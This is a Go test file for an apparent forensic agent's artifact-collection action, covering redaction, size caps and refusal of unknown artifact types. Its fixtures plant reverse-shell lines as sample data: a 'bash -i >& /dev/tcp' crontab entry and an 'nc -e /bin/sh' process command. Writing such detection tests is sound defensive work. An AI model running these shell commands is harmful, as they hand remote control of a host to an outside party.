package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// fakeRoot builds a fake host filesystem under a temp dir and points the collector at it.
func fakeRoot(t *testing.T, files map[string]string) {
	t.Helper()
	dir := t.TempDir()
	for p, c := range files {
		full := filepath.Join(dir, p)
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(c), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	old := collectRoot
	collectRoot = dir
	t.Cleanup(func() { collectRoot = old })
}

func collectArtifacts(t *testing.T, params string) (execResult, []collectedArtifact) {
	t.Helper()
	res := executeCommand(command{Action: "collect_artifacts", Params: json.RawMessage(params)}, false, false, "", nil)
	arts, _ := res.Result["artifacts"].([]collectedArtifact)
	return res, arts
}

func TestCollectArtifactsReadsFixedSources(t *testing.T) {
	fakeRoot(t, map[string]string{
		"/var/log/secure":                "Failed password for root from 203.0.113.9\n",
		"/etc/crontab":                   "* * * * * root bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n",
		"/etc/cron.d/backup":             "0 2 * * * root /usr/local/bin/backup\n",
		"/home/bob/.bash_history":        "mysql -u root --password=hunter2\nexport API_KEY=abc123\nmkdir -p /tmp/x\n",
		"/home/bob/.ssh/authorized_keys": "ssh-ed25519 AAAA attacker@evil\n",
	})
	res, arts := collectArtifacts(t, `{"types":["auth_log","cron","shell_history","ssh_authorized_keys","syslog","cron"]}`)
	if res.Status != "done" {
		t.Fatalf("status = %s %v", res.Status, res.Result)
	}
	if len(arts) != 5 {
		t.Fatalf("got %d artifacts, want 5 (duplicate cron collapsed)", len(arts))
	}
	by := map[string]collectedArtifact{}
	for _, a := range arts {
		by[a.Type] = a
	}
	if a := by["auth_log"]; a.Source != "/var/log/secure" || !strings.Contains(a.Content, "203.0.113.9") || a.SHA256 != sha256Hex(a.Content) {
		t.Errorf("auth_log = %+v, want the /var/log/secure alias with a matching hash", a)
	}
	if a := by["cron"]; !strings.Contains(a.Content, "==> /etc/crontab <==") || !strings.Contains(a.Content, "==> /etc/cron.d/backup <==") {
		t.Errorf("cron = %q, want both files with headers", a.Content)
	}
	h := by["shell_history"].Content
	if strings.Contains(h, "hunter2") || strings.Contains(h, "abc123") || !strings.Contains(h, "[REDACTED]") {
		t.Errorf("shell_history not redacted: %q", h)
	}
	if !strings.Contains(h, "mkdir -p /tmp/x") {
		t.Errorf("redaction over-matched a benign -p flag: %q", h)
	}
	if a := by["syslog"]; a.Error == "" || a.Content != "" {
		t.Errorf("syslog = %+v, want an absent-source error", a)
	}
}

func TestCollectArtifactsRefusesUnknownTypes(t *testing.T) {
	fakeRoot(t, nil)
	for _, p := range []string{
		`{"types":["/etc/shadow"]}`,
		`{"types":["auth_log","run_command"]}`,
		`{"types":[]}`,
		`{}`,
	} {
		res, _ := collectArtifacts(t, p)
		if res.Status != "failed" {
			t.Errorf("params %s: status = %s, want failed", p, res.Status)
		}
	}
}

func TestCollectArtifactsCapsSizeKeepingTheTail(t *testing.T) {
	big := strings.Repeat("old line\n", 20000) + "NEWEST LINE\n"
	fakeRoot(t, map[string]string{"/var/log/auth.log": big})
	_, arts := collectArtifacts(t, `{"types":["auth_log"],"maxBytes":1024}`)
	if len(arts) != 1 {
		t.Fatalf("artifacts = %d", len(arts))
	}
	a := arts[0]
	if len(a.Content) > 1024 || !a.Truncated || !strings.HasSuffix(a.Content, "NEWEST LINE\n") {
		t.Errorf("len=%d truncated=%v tail=%q, want a 1 KiB tail", len(a.Content), a.Truncated, a.Content[len(a.Content)-20:])
	}
	// A huge requested cap is clamped to the agent's own ceiling.
	_, arts = collectArtifacts(t, `{"types":["auth_log"],"maxBytes":99999999}`)
	if len(arts[0].Content) > maxArtifactBytes {
		t.Errorf("cap not clamped: %d", len(arts[0].Content))
	}
}

func TestCollectArtifactsGeneratedFromProc(t *testing.T) {
	fakeRoot(t, map[string]string{
		"/proc/42/status":  "Name:\tnc\nPPid:\t1\nUid:\t0\t0\t0\t0\n",
		"/proc/42/cmdline": "nc\x00-e\x00/bin/sh\x00203.0.113.9\x004444",
		"/proc/net/tcp": "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n" +
			"   0: 0100007F:1F90 097100CB:115C 01 00000000:00000000 00:00000000 00000000     0        0 12345 1\n",
	})
	_, arts := collectArtifacts(t, `{"types":["processes","network_connections"]}`)
	by := map[string]string{}
	for _, a := range arts {
		by[a.Type] = a.Content
	}
	if !strings.Contains(by["processes"], "42\t1\t0\tnc -e /bin/sh 203.0.113.9 4444") {
		t.Errorf("processes = %q", by["processes"])
	}
	if !strings.Contains(by["network_connections"], "127.0.0.1:8080\t203.0.113.9:4444\tESTABLISHED") {
		t.Errorf("network_connections = %q", by["network_connections"])
	}
}

func TestCollectArtifactsIsAllowlisted(t *testing.T) {
	if !allowedActions["collect_artifacts"] {
		t.Fatal("collect_artifacts must be in the agent action table")
	}
}
